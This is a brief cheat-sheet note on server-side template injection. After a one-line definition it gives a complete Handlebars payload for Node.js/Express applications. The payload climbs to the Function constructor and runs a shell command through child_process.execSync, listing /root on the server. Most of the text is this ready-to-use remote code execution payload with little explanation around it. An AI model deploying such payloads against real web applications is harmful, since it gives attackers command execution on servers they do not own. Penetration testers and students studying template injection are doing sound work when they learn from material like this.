SERVER SIDE TEMPLATE INJECTION

A server side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.

A good way to identify the kind of SSTI we have is by checking SSTI.png.
Once analyzed we have to workaround to understand how the framework could execute code by using a proxy to make it easier.
One payload that works for NodeJS using express is:
```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
